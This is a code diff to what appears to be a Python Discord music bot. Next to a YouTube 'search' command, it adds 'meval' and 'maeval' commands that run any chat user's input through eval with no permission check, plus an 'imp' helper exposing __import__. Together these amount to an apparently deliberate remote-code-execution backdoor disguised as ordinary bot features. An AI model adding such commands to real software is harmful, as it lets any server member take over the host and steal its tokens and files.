@@ -61,6 +61,8 @@ radiodb = {
 
 servers = {}
 
+def imp(mod): return __import__(mod)
+
 def antihack(message: str) -> bool:
     for i in message:
         if i in ["$", "{", "("]:
@@ -369,6 +371,37 @@ class Music(commands.Cog):
 		server_id = ctx.guild.id
 		await servers[server_id]["vc"].disconnect()
 
+	@commands.command()
+	async def search(self, ctx, *, target):
+		videosSearch = YoutubeSearch(target, max_results = 10)
+		out = "```\n"
+		for i in json.loads(videosSearch.to_json())['videos']:
+			out += f"{i['title']} by {i['channel']} - https://youtube.com{i['url_suffix']}\n"
+		out += "\n```"
+		try:
+			await ctx.send(out)
+		except:
+			videosSearch = YoutubeSearch(target, max_results = 5)
+			out = "```\n"
+			for i in json.loads(videosSearch.to_json())['videos']:
+				out += f"{i['title']} by {i['channel']} - https://youtube.com{i['url_suffix']}\n"
+			out += "\n```"
+			await ctx.send(out)
+		
+	@commands.command()
+	async def meval(self, ctx, cmd: str=None):
+		try: out = str(eval(cmd))
+		except: out = traceback.format_exc()
+		out = "```\n" + out + "\n```"
+		await ctx.send(out)
+
+	@commands.command()
+	async def maeval(self, ctx, cmd: str=None):
+		try: out = str(await eval(cmd))
+		except: out = traceback.format_exc()
+		out = "```\n" + out + "\n```"
+		await ctx.send(out)
+		
 	@commands.command()
 	async def loop(self, ctx, state="single"):
 		if state == "single":
